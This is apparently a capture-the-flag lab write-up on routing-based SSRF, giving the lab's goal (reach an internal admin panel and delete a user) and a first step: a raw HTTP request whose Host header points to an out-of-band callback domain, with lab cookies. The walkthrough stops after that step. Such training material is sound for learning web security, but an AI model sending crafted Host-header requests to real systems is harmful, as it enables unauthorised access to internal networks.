# **SSRF via flawed request parsing**

Task: This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.

To solve the lab, access the internal admin panel located in the `192.168.0.0/24` range, then delete the user `carlos`.

Toolkit: Burosuite, Browser

1. Send req with your server

GET https://0afc00a8030ce846825451c7002b00a6.web-security-academy.net/ HTTP/2  
Host: qrl25awprrhfkm1bw3r8af75ww2oqhe6.oastify.com  
Cookie: session=EROel92QPchBCTFYydhwKEGWmU2qmos7; \_lab=46%7cMCwCFHsJhVSV%2bogzvwrlH%2bQQx3yl7y8qAhR5LZwFILsNobo43kBTMpf3AjrsLuht35I6sHLHC9R5%2b5q4v%2fDtV3X0c8O3%2bX6fu4CfvdV9HmonovVzX6PRemnr2JUCEzdV2ATEt3VoD6B9UmcxhTA9PRJ9adaux1VopgoS%2bO4XkFGmhDI%3d
